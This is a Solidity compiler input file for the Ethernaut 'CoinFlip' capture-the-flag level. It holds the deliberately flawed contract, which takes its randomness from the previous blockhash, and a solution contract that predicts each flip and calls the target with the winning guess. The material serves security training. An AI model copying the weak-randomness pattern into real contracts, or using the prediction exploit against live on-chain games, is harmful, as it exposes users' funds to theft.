{
  "language": "Solidity",
  "sources": {
    "contracts/level-03-coin-flip/CoinFlip.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor() {\n        consecutiveWins = 0;\n    }\n\n    function flip(bool _guess) public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n        if (side == _guess) {\n            consecutiveWins++;\n            return true;\n        } else {\n            consecutiveWins = 0;\n            return false;\n        }\n    }\n}"
    },
    "contracts/level-03-coin-flip/solution/CoinFlipGues.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n/**\n * @title ICoinFlip\n * @dev Interface for the CoinFlip contract from the Ethernaut CTF challenge\n */\ninterface ICoinFlip {\n    /**\n     * @dev Makes a guess on the coin flip\n     * @param _guess The boolean guess (true for heads, false for tails)\n     * @return Whether the guess was correct\n     */\n    function flip(bool _guess) external returns (bool);\n    \n    /**\n     * @dev Returns the number of consecutive correct guesses\n     * @return The number of consecutive wins\n     */\n    function consecutiveWins() external view returns (uint256);\n}\n\n/**\n * @title GuessCoinFlip\n * @dev Solution contract for the CoinFlip Ethernaut challenge\n * @notice This contract exploits the predictable randomness in the CoinFlip contract\n * @custom:security-contact security@example.com\n */\ncontract GuessCoinFlip {\n    /// @notice Reference to the target CoinFlip contract\n    ICoinFlip public coinFlip;\n    \n    /// @notice Address of the target CoinFlip contract\n    address public coinflipAddress;\n    \n    /// @notice The same factor used in the original CoinFlip contract\n    /// @dev Used to calculate the coin flip result in the same way as the target contract\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    /**\n     * @dev Constructor sets the address of the CoinFlip contract to attack\n     * @param _coinFlipAddress The address of the deployed CoinFlip contract\n     */\n    constructor(address _coinFlipAddress) {\n        coinflipAddress = _coinFlipAddress;\n        coinFlip = ICoinFlip(coinflipAddress);\n    }\n\n    /**\n     * @dev Predicts the outcome of the next coin flip and makes the correct guess\n     * @notice This function calculates the result of the next coin flip using the same algorithm\n     * as the target contract, then submits that guess to guarantee a win\n     */\n    function getCoinFlip() public {\n        // Use the same algorithm as the CoinFlip contract to predict the result\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n        uint256 coinFlipFactor = blockValue / FACTOR;\n        bool side = coinFlipFactor == 1 ? true : false;\n\n        // Call the flip function with our predicted result\n        coinFlip.flip(side);\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    }
  }
}